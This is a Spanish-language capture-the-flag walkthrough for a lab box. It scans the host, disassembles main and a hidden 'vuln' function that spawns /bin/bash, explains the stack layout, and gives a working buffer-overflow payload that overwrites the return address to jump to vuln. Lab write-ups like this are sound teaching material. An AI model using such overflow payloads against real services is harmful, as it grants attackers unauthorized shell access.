

# SCAN

```
PORT      STATE SERVICE
22/tcp    open  ssh
111/tcp   open  rpcbind
5700/tcp  open  supportassist
52383/tcp open  unknown
```
En el puerto 5700 esta activo un servicio llamado **supportassist**. Cuando conectamos con este servicio nos sale el siguiente banner:
```
┌──(kali㉿kali)-[~/reverse/QAPWN]
└─$ telnet 10.10.108.59 5700
Trying 10.10.108.59...
Connected to 10.10.108.59.
Escape character is '^]'.
Welcome dearQA
I am sysadmin, i am new in developing
What's your name: jose
jose

Hello: jose
Connection closed by foreign host.
```
# REVERSE ENGENEERING

Existen dos funciones que nos interesan:

1. main



```
   0x00000000004006c3 <+0>:     push   rbp
   0x00000000004006c4 <+1>:     mov    rbp,rsp
   0x00000000004006c7 <+4>:     sub    rsp,0x20
   0x00000000004006cb <+8>:     mov    edi,0x400803
   0x00000000004006d0 <+13>:    call   0x400520 <puts@plt>
   0x00000000004006d5 <+18>:    mov    edi,0x400818
   0x00000000004006da <+23>:    call   0x400520 <puts@plt>
   0x00000000004006df <+28>:    mov    edi,0x40083e
   0x00000000004006e4 <+33>:    mov    eax,0x0
   0x00000000004006e9 <+38>:    call   0x400530 <printf@plt>
   0x00000000004006ee <+43>:    mov    rax,QWORD PTR [rip+0x20051b]        # 0x600c10 <stdout@@GLIBC_2.2.5>
   0x00000000004006f5 <+50>:    mov    rdi,rax
   0x00000000004006f8 <+53>:    call   0x400570 <fflush@plt>
   0x00000000004006fd <+58>:    lea    rax,[rbp-0x20]
   0x0000000000400701 <+62>:    mov    rsi,rax
   0x0000000000400704 <+65>:    mov    edi,0x400851
   0x0000000000400709 <+70>:    mov    eax,0x0
   0x000000000040070e <+75>:    call   0x400580 <__isoc99_scanf@plt>
   0x0000000000400713 <+80>:    lea    rax,[rbp-0x20]
   0x0000000000400717 <+84>:    mov    rsi,rax
   0x000000000040071a <+87>:    mov    edi,0x400854
   0x000000000040071f <+92>:    mov    eax,0x0
   0x0000000000400724 <+97>:    call   0x400530 <printf@plt>
   0x0000000000400729 <+102>:   mov    eax,0x0
   0x000000000040072e <+107>:   leave  
   0x000000000040072f <+108>:   ret    
```
Esta funcion realmente no hace nada. Es un banner donde se nos solicita el nombre y con el nombre que introducimos nos manda un saludo
2. vuln

```
0x0000000000400686 <+0>:     push   rbp
   0x0000000000400687 <+1>:     mov    rbp,rsp
   0x000000000040068a <+4>:     mov    edi,0x4007b8
   0x000000000040068f <+9>:     call   0x400520 <puts@plt>
   0x0000000000400694 <+14>:    mov    edi,0x4007d0
   0x0000000000400699 <+19>:    call   0x400520 <puts@plt>
   0x000000000040069e <+24>:    mov    rax,QWORD PTR [rip+0x20056b]        # 0x600c10 <stdout@@GLIBC_2.2.5>
   0x00000000004006a5 <+31>:    mov    rdi,rax
   0x00000000004006a8 <+34>:    call   0x400570 <fflush@plt>
   0x00000000004006ad <+39>:    mov    edx,0x0
   0x00000000004006b2 <+44>:    mov    esi,0x0
   0x00000000004006b7 <+49>:    mov    edi,0x4007f9
   0x00000000004006bc <+54>:    call   0x400550 <execve@plt>
   0x00000000004006c1 <+59>:    pop    rbp
   0x00000000004006c2 <+60>:    ret    
```
Esta funcion es la mas importante porque cuando se entra en ella se hace ejecuta un shell (/bin/bash):
>  0x00000000004006bc <+54>:    call   0x400550 <execve@plt>

El problema es que la funcion vuln parece estar totalmente desconectada de la funcion main, ya que en ningun momento en la funcion main se hace una llamada a la funcion vuln. ¿Como resolvemos esto?
La respuesta esta en crear un **buffer overflow** y aprovecharnos de como se organiza la pila (stack) para redirigir la salida de la funcion main a la funcion vuln, de forma que al terminar la funcion main se ejecute la funcion vuln

# ORGANIZACION DE LA PILA

Stack se organiza de la siguiente manera:

```
variables locales
rbp (registro base pointer o frame pointer)
rip (Se guarda la direccion de retorno para cuando acabe de ejecutarse la funcion)
argumentos (los argumentos de llamada de la funcion -en este caso no tiene-)

```

En este caso podemos provocar un buffer overflow de forma que la direccion de la pila donde se guarda la direccion de retorno se reescriba con
la dirección de entrada en la funcion vuln que es:

>0x0000000000400686

El payload debe ser algo como:
> $(python3 -c 'print ("A" * 32 + "B" *  8 + "\x86\x06\x40\x00\x00\x00\x00\x00")')




